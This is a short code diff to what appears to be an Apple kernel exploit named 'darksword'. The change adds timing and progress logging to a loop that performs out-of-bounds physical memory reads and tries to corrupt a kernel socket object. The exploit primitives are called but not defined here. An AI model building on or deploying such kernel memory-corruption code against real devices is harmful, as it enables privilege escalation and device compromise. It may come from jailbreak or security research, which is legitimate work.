@@ -1489,6 +1489,8 @@ bool run_darksword(void) {
                 VM_PROT_DEFAULT, &memObj, 0);
             surface_mlock(sma, searchSize);
 
+            uint64_t pagesDone = 0;
+            uint64_t mStart = mach_absolute_time();
             for (mach_vm_offset_t so = 0; so <= searchSize - pcSize; so += PAGE_SIZE) {
                 if (phys_oob_read(memObj, so, OOB_SIZE, OOB_OFFSET, rBuf) == KERN_SUCCESS) {
                     if (find_and_corrupt_socket(memObj, so, rBuf, wBuf, usedGc, false) == 0) {
@@ -1496,7 +1498,18 @@ bool run_darksword(void) {
                         break;
                     }
                 }
+                pagesDone++;
+                if ((pagesDone & 0x1FF) == 0) {
+                    double mEl = (double)(mach_absolute_time() - mStart) * (double)timebase.numer / (double)timebase.denom / 1000000000.0;
+                    printf("[exploit]   map %llu page %llu/0x%llx readOK=%d try=%d %.1fs\n",
+                        s, pagesDone, searchSize / PAGE_SIZE, successReadCount, highestSuccessIdx, mEl);
+                    fflush(stdout);
+                }
             }
+            double mEl = (double)(mach_absolute_time() - mStart) * (double)timebase.numer / (double)timebase.denom / 1000000000.0;
+            printf("[exploit]   map %llu done: readOK=%d try=%d %.1fs\n",
+                s, successReadCount, highestSuccessIdx, mEl);
+            fflush(stdout);
             mach_port_deallocate(mach_task_self(), memObj);
             if (ok) break;
         }
